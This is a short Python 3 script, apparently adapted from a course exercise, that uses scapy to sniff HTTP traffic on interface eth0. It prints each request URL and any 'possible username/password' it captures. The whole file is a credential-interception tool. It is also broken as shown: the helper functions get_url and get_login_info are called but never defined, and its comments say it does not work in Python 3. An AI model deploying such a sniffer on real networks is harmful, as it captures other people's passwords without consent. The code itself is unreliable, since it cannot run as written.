#!/usr/bin/env python3

#adapted from packet_sniffer_python3.py
#This WON'T actually work in python3 currently
#Need to run as python 2, http layer support is different now that scapy_http is deprecated

import scapy.all as scapy
from scapy.layers import http #need scapy_http installed

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #haslayer - scapy method        
        url = get_url(packet)
        print("[+] HTTP Request: " + url)
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password found:" + login_info + "\n\n")
            
sniff("eth0")
